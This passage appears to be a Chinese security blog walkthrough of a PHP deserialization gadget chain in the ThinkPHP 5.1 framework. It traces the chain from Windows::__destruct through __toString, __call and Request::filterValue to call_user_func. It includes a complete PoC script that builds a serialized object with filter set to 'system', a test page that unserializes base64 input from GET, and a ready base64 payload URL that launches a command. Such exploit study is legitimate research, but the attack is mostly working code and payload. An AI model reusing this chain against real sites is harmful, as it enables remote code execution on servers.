文件</span><br><span class="line">│  └─start.php          框架引导文件</span><br><span class="line">├─build.php             自动生成定义文件（参考）</span><br><span class="line">├─composer.json         composer 定义文件</span><br><span class="line">├─LICENSE.txt           授权说明文件</span><br><span class="line">├─README.md             README 文件</span><br><span class="line">├─think                 命令行入口文件</span><br></pre></td></tr></table></figure>

<h1 id="tp5-1"><a href="#tp5-1" class="headerlink" title="tp5.1"></a>tp5.1</h1><h2 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h2><p>全局搜索一下__destruct </p>
<p>在windows.php中找到一个__destruct，貌似可用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用removeFiles()方法，跟进removeFiles()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有file_exists() 可以触发__toString</p>
<h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h2><p>全局搜索一下__toString </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进toJson()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进toArray() 在192行代码处，有一个调用类的方法，可以触发__call </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            $relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">                $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                $relation-&gt;visible($name);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>看看变量是否可控</p>
<p>$this-&gt;append 一个数组，对象的属性 ，可控  </p>
<p>往下走 </p>
<p>有一个is_array($name)的判断，让$this-&gt;append中的值为数组就可以</p>
<p>下面会调用getRelation($key)   跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#RelationShip.php    </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因为上面有if (!$relation)  所以这里返回空就好 return;</p>
<p>继续往下走，调用了$this-&gt;getAttr($key)，跟进getAttr()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Attribute.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         $notFound = <span class="keyword">false</span>;</span><br><span class="line">         $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br></pre></td></tr></table></figure>

<p>跟进getData</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>$this-&gt;data可控，</p>
<p>能够调用到$relation-&gt;visible($name)了;  去找一下__call</p>
<h2 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h2><p>全局搜索一下__call</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">        array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>__call方法内有一个call_user_array函数 可以用来执行代码，但是这里的$args经过了array_unshift，第一个参数变成了$this，</p>
<p>现在回看一下 那些是可控的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Conversion  append可控 </span><br><span class="line"></span><br><span class="line">Attribute   data可控 </span><br><span class="line"></span><br><span class="line">$relation-&gt;visible($name)可控</span><br><span class="line"></span><br><span class="line">$this-&gt;hook[$method]可控</span><br></pre></td></tr></table></figure>

<h2 id="分析代码执行位置"><a href="#分析代码执行位置" class="headerlink" title="分析代码执行位置"></a>分析代码执行位置</h2><p>$arg参数被固定，所以要找一个不受$arg参数影响的方法</p>
<p>参考tp5的执行RCE 有一个比较常见的位置filter</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br></pre></td></tr></table></figure>

<p>这里调用了call_user_func，貌似可以RCE</p>
<p>但是直接把 hook[‘method’] 赋值filterValue   那么$value对应的就是$arg  不可控， 再找找</p>
<p>找一下哪里调用了filterValue方法，</p>
<p>input()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">			...</span><br><span class="line">			...</span><br><span class="line">            $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line">			...</span><br><span class="line">			...</span><br><span class="line">        <span class="comment">// 解析过滤器</span></span><br><span class="line">        $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">            array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">            <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>乍一看data不可控，再往下看看</p>
<p>先是经过了$this-&gt;getData  $this-&gt;getFilter</p>
<p>跟进一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(array $data, $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">            $data = $data[$val];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里直接$data = $data[$val]; 然后return $data;  $data可控了 </p>
<p>但是如果直接把hook[$method]直接赋值为input，name就不可控了，$data的赋值和name还有关系<code>explode(&#39;.&#39;, $name) as $val</code></p>
<p>不行  再找一下哪里调用了input方法，能不能控制name参数</p>
<p>param方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">            <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">            $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">            $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>return $this-&gt;input($this-&gt;param, $name, $default, $filter);</code></p>
<p>$this-&gt;param 是$_GET数组传过来的值，可控 </p>
<p>但name不可控，这里的$name 接收的是$arg传来的参数，因为$arg不可控，所以$name同样不可控，继续找哪里调用了param方法</p>
<p>isAjax方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">    $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;param($this-&gt;config[&#39;var_ajax&#39;]) ? true : $result;</code></p>
<p>把$this-&gt;config[‘var_ajax’]传给param的name参数，这样name就可控了</p>
<p>往下看 控制filter参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">        $filter = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看这里<code>$filter = $filter ?: $this-&gt;filter;</code>   $filter可控</p>
<p>现在调用filterValue方法的参数都已经可控了 $data $filter</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);</span><br></pre></td></tr></table></figure>

<p>POC</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"xxx"</span>=&gt;[<span class="string">"calc.exe"</span>,<span class="string">"calc"</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"xxx"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">'xxx'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在public/index.php加一个触发点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$str=base64_decode($_GET[<span class="string">'str'</span>]);</span><br><span class="line">unserialize($str);</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5/public/?str=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19&amp;xxx=calc</span><br></pre></td></tr></table></figure>

<p>计算器会弹出来</p>
<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>看了很长时间，很多遍才看了个差不多</p>
<p><strong>No.1</strong>  反序列化找可控变量，像$this-&gt;key这种的变量，可控的几率较大，因为是类的属性，可以直接通过反序列化得到</p>
<p><strong>No.2</strong>  几个函数的用法，call_user_func_array可以调用类的方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bar</span><span class="params">($arg, $arg2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>, <span class="string">" got $arg and $arg2\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$foo = <span class="keyword">new</span> foo;</span><br><span class="line">call_user_func_array(<span class="keyword">array</span>($foo, <span class="string">"bar"</span>), <span class="keyword">array</span>(<span class="string">"three"</span>, <span class="string">"four"</span>));</span><br><span class="line">等效于</span><br><span class="line">$foo-&gt;bar(<span class="string">"three"</span>,<span class="string">"four"</span>)</span><br></pre></td></tr></table></figure>

<p><strong>No.3</strong>  </p>
<p>反序列化常用的魔法函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__call	调用不可访问或不存在的方法时被调用</span><br><span class="line">__callStatic	调用不可访问或不存在的静态方法时被调用</span><br><span class="line">__clone	进行对象clone时被调用，用来调整对象的克隆行为</span><br><span class="line">__constuct	构建对象的时被调用；</span><br><span class="line">__debuginfo	当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</span><br><span class="line">__destruct	明确销毁对象或脚本结束时被调用；</span><br><span class="line">__get	读取不可访问或不存在属性时被调用</span><br><span class="line">__invoke	当以函数方式调用对象时被调用</span><br><span class="line">__isset	对不可访问或不存在的属性调用isset()或empty()时被调用</span><br><span class="line">__set	当给不可访问或不存在属性赋值时被调用</span><br><span class="line">__set_state	当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。</span><br><span class="line">__sleep	当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</span><br><span class="line">__toString	当一个类被转换成字符串时被调用</span><br><span class="line">__unset	对不可访问或不存在的属性进行unset时被调用</span><br><span class="line">__wakeup	当使用unserialize时被调用，可用于做些对象的初始化操作</span><br></pre></td></tr></table></figure>

<p>反序列化常见起点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__wakeup 一定会调用</span><br><span class="line"></span><br><span class="line">__destruct 一定会调用</span><br><span class="line"></span><br><span class="line">__toString 当一个对象被反序列化后又被当做字符串使用</span><br></pre></td></tr></table></figure>

<p>反序列化常见跳板</p>
